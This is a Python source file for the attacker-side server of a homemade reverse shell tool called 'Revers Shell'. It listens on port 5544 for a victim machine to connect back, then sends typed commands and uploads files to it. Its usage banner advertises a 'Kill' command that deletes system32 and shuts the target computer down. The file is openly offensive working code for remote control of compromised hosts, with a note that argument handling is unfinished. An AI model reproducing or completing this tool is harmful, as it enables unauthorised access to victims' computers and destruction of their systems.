# TODO - commade with argument is handle but the revershell can't resolve it


# 1 - Import the right module
import socket
import pyfiglet
import os

# Upload File Test
file_test = "test2.txt"

# Pyfiglet stuff
pyflig = pyfiglet.figlet_format("Revers Shell")

# 2 - Server IP / Port
server_conf = 'localhost', 5544

# 3 - Create socket TCP/IP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 4 - Bind the socket to the port
sock.bind(server_conf)

# 5 - Listening for incoming connexion
print(pyflig)
print("=====================================================")
print("| Version: 1.2                                      |")
print("| Project by: Philippe-Alexandre Munch              |")
print("| Contributor: @Prat                                |")
print("=====================================================")
print(" ")
print("[!] Waiting Target Connexion")

sock.listen(1)

# 6 - Accept Connection
connection, client_address = sock.accept()

# 7 receive data from client_address
data = connection.recv(3096).decode("utf-8")
print(" ")
print('[*] Target: ', "\U0001F608 " "%s" % data, "\U0001F608")
print(" ")
print("========================================================================")
print("| [*] Usage: basic Remote Shell [*]                                    |")
print("|- Args: enter [cd /] to go directly to c:/                            |")
print("|- Args: enter [cd] to get actual directory                            |")
print("|- Args: enter [exit] for close the session                            |")
print("|- Args: enter [upload] for Upload a file                              |")
print(u"| \u2620 \u2620 \u2620: enter [Kill] for delete system32 and shutdown computer     |")
print("========================================================================")
print(" ")

while True:

    #            #
    # Send Block #
    #            #

    # Input attacker
    cmd = input("target@>")
    connection.sendall(cmd.encode("utf-8"))

    # If command rcv is empty
    if len(cmd) == 0:
        connection.sendall("echo [!] Error: Command Empty".encode("utf-8"))

    # Test Upload file
    if cmd == "upload":
        f = open(file_test, 'rb')
        l = f.read(1024)
        connection.sendall(l)

    #               #
    # Receive BLock #
    #               #

    # get rcv data
    # Recv data not working with can't be decode by 'utf-8', utf-8 not handle accent so (windows-1252 works)
    # But the accent is still not handle
    data = connection.recv(2048).decode("windows-1252")

    # print rcv data
    print(data)

    # Closing connenection
    if data == "Exiting...":
        print("[!] Connexion Closed")
        sock.close()
        exit()
